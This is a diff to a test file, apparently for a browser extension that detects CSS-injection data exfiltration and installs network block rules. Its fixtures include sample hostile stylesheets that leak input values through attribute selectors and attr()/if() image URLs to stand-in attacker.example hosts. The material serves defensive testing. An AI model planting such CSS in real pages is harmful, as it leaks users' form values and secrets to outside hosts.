@@ -43,7 +43,7 @@ describe("browser integrations", () => {
   it("creates DNR rules for high confidence findings and strict third-party blocking", async () => {
     const finding = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" }).findings[0] as Finding;
     const result = await blockHighConfidenceFindingUrls([finding], 1);
-    expect(result.blockedFindings.has(finding.id)).toBe(true);
+    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
     const policy = await getSitePolicy();
     await setStrictThirdPartyRule(1, true, { ...policy, mode: "strict" }, "https://app.example/");
     expect((browser.declarativeNetRequest as any).__getSessionRules().length).toBeGreaterThan(0);
@@ -149,6 +149,52 @@ describe("browser integrations", () => {
   });
 
 
+
+  it("does not use URL fragments as SVG evidence and installs exact finding rules", async () => {
+    const finding = analyzeStylesheet({
+      cssText: 'input[value*="a"]{background:url(https://app.example/poc.png#;base64,a)}',
+      pageUrl: "https://app.example/",
+      sourceKind: "style_element",
+      sourceUrl: "https://app.example/"
+    }).findings[0] as Finding;
+    expect(finding.reasons).not.toContain("sink.svg_reference");
+    const result = await blockHighConfidenceFindingUrls([finding], 31, { ...DEFAULT_SITE_POLICY, mode: "strict" }, "strict");
+    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
+    const rules = (browser.declarativeNetRequest as any).__getSessionRules();
+    expect(rules.some((rule: unknown) => regexFilter(rule) === "^https://app\\.example/poc\\.png$" && tabIds(rule)?.includes(31))).toBe(true);
+  });
+
+  it("installs finding-derived future-block rules for same-origin value-probe sinks in Balanced and Strict", async () => {
+    const finding = analyzeStylesheet({
+      cssText: '#exfil_test2[value*="secret"]~#exfil_img2{background-image:url(https://app.example/src/pwned2.png)}',
+      pageUrl: "https://app.example/",
+      sourceKind: "style_element",
+      sourceUrl: "https://app.example/style.css"
+    }).findings[0] as Finding;
+    expect(finding.severity).toBe("high");
+
+    const balanced = await blockHighConfidenceFindingUrls([finding], 32, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
+    expect(balanced.blockedFindings.size).toBe(0);
+    expect(balanced.ruleInstalledFindings.has(finding.id)).toBe(true);
+
+    const strict = await blockHighConfidenceFindingUrls([finding], 33, { ...DEFAULT_SITE_POLICY, mode: "strict" }, "strict");
+    expect(strict.blockedFindings.size).toBe(0);
+    expect(strict.ruleInstalledFindings.has(finding.id)).toBe(true);
+  });
+
+  it("installs finding-derived future-block rules for declaration-level attr()/if() exfil sinks", async () => {
+    const finding = analyzeStylesheet({
+      cssText: 'div{--user:attr(data-user);background:image-set(if(style(--user:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}',
+      pageUrl: "https://app.example/",
+      sourceKind: "inline_style",
+      sourceUrl: "https://app.example/"
+    }).findings[0] as Finding;
+    expect(finding.reasons).toContain("css.value.attr_source");
+    expect(finding.reasons).toContain("css.value.conditional_if");
+    const result = await blockHighConfidenceFindingUrls([finding], 34, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
+    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
+  });
+
   it("prioritizes stronger DNR candidates when the dynamic rule cap is reached", async () => {
     const remoteFindings = Array.from({ length: 55 }, (_, index) => analyzeStylesheet({
       cssText: `input[value^="${String.fromCharCode(97 + (index % 26))}"]{background:url(https://attacker-${index}.example/leak)}`,
@@ -164,8 +210,8 @@ describe("browser integrations", () => {
     }).findings[0] as Finding;
 
     const result = await blockHighConfidenceFindingUrls([...remoteFindings, localNetworkFinding], 27);
-    expect(result.blockedFindings.has(localNetworkFinding.id)).toBe(true);
-    expect(result.blockedUrls).toContain("http://192.168.0.12/leak");
+    expect(result.ruleInstalledFindings.has(localNetworkFinding.id)).toBe(true);
+    expect(result.ruleInstalledUrls).toContain("http://192.168.0.12/leak");
   });
 
   it("caps report frames and findings before storage", async () => {
